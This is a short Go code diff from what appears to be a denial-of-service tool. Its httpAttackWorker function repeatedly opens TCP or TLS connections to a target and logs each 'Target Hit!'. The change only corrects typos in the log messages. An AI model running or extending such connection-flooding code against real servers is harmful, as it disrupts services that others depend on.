@@ -31,12 +31,12 @@ func httpAttackWorker(workerID int, jobs chan int, result chan int) {
 				_, err := net.Dial("tcp", address)
 		
 				if err != nil {
-					log.Printf("Worbad: %d - response target! - %d \n", workerID, job)
+					log.Printf("Workbad: %d - response target! - %d \n", workerID, job)
 					result <- 0
 					continue
 				}
 		
-				log.Printf("Worgood: %d - Job:%d - Target Hit! \n", workerID, job)
+				log.Printf("Workgood: %d - Job:%d - Target Hit! \n", workerID, job)
 				result <- 1 
 			}
 		case 443:
@@ -47,12 +47,12 @@ func httpAttackWorker(workerID int, jobs chan int, result chan int) {
 				_, err := tls.Dial("tcp", address, config)	
 
 				if err != nil {
-					log.Printf("Worbad: %d - response target! - %d \n", workerID, job)
+					log.Printf("Workbad: %d - response target! - %d \n", workerID, job)
 					result <- 0
 					continue
 				}
 		
-				log.Printf("Worgood: %d - Job:%d - Target Hit! \n", workerID, job)
+				log.Printf("Workgood: %d | Job:%d | Target Hit! \n", workerID, job)
 				result <- 1 
 			}
 		default:
